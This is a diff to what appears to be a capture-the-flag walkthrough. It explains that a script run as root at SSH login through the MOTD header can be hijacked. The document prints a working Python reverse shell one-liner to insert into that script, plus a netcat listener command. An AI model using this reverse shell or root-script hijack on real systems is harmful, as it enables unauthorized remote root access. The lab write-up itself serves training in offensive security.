@@ -78,10 +78,8 @@ Access the web server running on port 80 by visiting **htpp://<target_IP>** in t
    
 ![Screenshot 2024-09-01 at 6 47 56 PM](https://github.com/user-attachments/assets/2661a901-2a0f-4dc7-9d5f-45657e7f54b0)
 
-
-
-
-    - Look at the 
+- Look in the '**/etc/update-motd.d/00-header**' folder and the '**00-header**' file shows that the '**/opt/cube/cube.sh**' file is run when a user connects to the 
+  machine using SSH (and will run as root user).
   - Edit **cube.sh** by inserting a Python reverse shell:
     - **python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local-IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'**
   - Set up a Netcat listener on local machine: **nc -nlvp 1234**
